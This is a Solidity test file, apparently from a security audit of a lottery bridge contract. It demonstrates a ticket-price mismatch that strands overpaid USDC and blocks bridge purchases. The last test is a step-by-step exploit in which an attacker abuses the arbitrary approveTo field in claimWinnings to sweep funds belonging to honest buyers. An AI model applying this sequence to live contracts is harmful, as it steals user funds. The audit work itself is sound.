// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "./BridgeSetup.sol";
import { JackpotBridgeManager } from "../../contracts/JackpotBridgeManager.sol";

/// Lead: JackpotBridgeManager.buyTickets charges the *global* jackpot.ticketPrice() (next-drawing price),
/// while Jackpot.buyTickets charges drawingState[currentDrawingId].ticketPrice. setTicketPrice() only changes
/// the global value, so the two diverge for the rest of the current drawing after any price change.
contract BridgeTicketPriceTest is BridgeSetup {
    /// Price raised mid-drawing: bridge buyers overpay and the excess is stranded in the bridge forever.
    function test_priceIncrease_bridgeBuyerOverpays_excessStranded() public {
        jackpot.setTicketPrice(2 * USDC); // applies from next drawing; current drawing still 1 USDC

        uint256 buyerBefore = usdc.balanceOf(buyer);
        uint256[] memory ids = bridgeBuy(buyer, buyer, tickets(10), type(uint256).max);

        assertEq(ids.length, 10);
        assertEq(buyerBefore - usdc.balanceOf(buyer), 20 * USDC, "buyer charged 2x");
        // Jackpot only took 10 USDC; 10 USDC sits in the bridge, which has no sweep/rescue function
        assertEq(usdc.balanceOf(address(bridge)), 10 * USDC, "excess stranded in bridge");
        // and a leftover allowance to the jackpot remains (Zellic 3.12 assumed allowances are always fully spent)
        assertEq(usdc.allowance(address(bridge), address(jackpot)), 10 * USDC);
    }

    /// Price lowered mid-drawing: every bridge purchase reverts until the next drawing.
    function test_priceDecrease_bridgePurchasesDoS() public {
        jackpot.setTicketPrice(USDC / 2);

        (address[] memory r, uint256[] memory s) = noRefs();
        IJackpot.Ticket[] memory ts = tickets(1);
        vm.startPrank(buyer);
        usdc.approve(address(bridge), type(uint256).max);
        vm.expectRevert(); // ERC20InsufficientAllowance inside Jackpot.buyTickets
        bridge.buyTickets(ts, buyer, r, s, bytes32(0));
        vm.stopPrank();

        // direct purchases on the Jackpot still work, so only bridge (cross-chain) users are locked out
        vm.startPrank(buyer);
        usdc.approve(address(jackpot), type(uint256).max);
        jackpot.buyTickets(ts, buyer, r, s, bytes32(0));
        vm.stopPrank();
    }

    /// Aggravation: stranded USDC can be taken by any bridge user with a winning ticket, using the arbitrary
    /// approveTo/to in claimWinnings to leave themselves an allowance that is never spent.
    function test_strandedUsdcStolenViaLeftoverApproval() public {
        // 1) price raised; honest bridge buyers strand 10 USDC
        jackpot.setTicketPrice(2 * USDC);
        bridgeBuy(buyer, buyer, tickets(10), type(uint256).max);
        assertEq(usdc.balanceOf(address(bridge)), 10 * USDC);

        // 2) attacker owns a bridged ticket that wins something (any tier)
        (address attacker, uint256 attackerKey) = makeAddrAndKey("attacker");
        usdc.transfer(attacker, 10 * USDC);
        IJackpot.Ticket[] memory at = new IJackpot.Ticket[](1);
        at[0] = ticket(1, 2, 3, 4, 30, 2);
        uint256[] memory ids = bridgeBuy(attacker, attacker, at, type(uint256).max);
        settle(1, 2, 3, 4, 30, 2); // jackpot win for simplicity; any claimable tier works

        uint256 winAmount = payout.getTierPayout(1, 11);
        uint256 claimed = winAmount - winAmount * 0.05e18 / 1e18; // minus referralWinShare
        assertGt(claimed, 0);

        // 3) "bridge" call just transfers the winnings to the attacker, while approveTo leaves them an allowance
        JackpotBridgeManager.RelayTxData memory rd = JackpotBridgeManager.RelayTxData({
            approveTo: attacker,
            to: address(usdc),
            data: abi.encodeWithSelector(IERC20.transfer.selector, attacker, claimed)
        });
        (uint8 v, bytes32 r_, bytes32 s_) = vm.sign(attackerKey, bridge.createClaimWinningsEIP712Hash(ids, rd));
        bridge.claimWinnings(ids, rd, abi.encodePacked(r_, s_, v));

        // 4) attacker sweeps the stranded funds that belonged to the honest buyer
        uint256 stranded = usdc.balanceOf(address(bridge));
        uint256 take = stranded < claimed ? stranded : claimed;
        vm.prank(attacker);
        usdc.transferFrom(address(bridge), attacker, take);
        assertEq(usdc.balanceOf(address(bridge)), stranded - take);
        assertEq(take, 11 * USDC, "10 USDC honest-buyer overpayment + attacker own 1 USDC swept");
    }
}
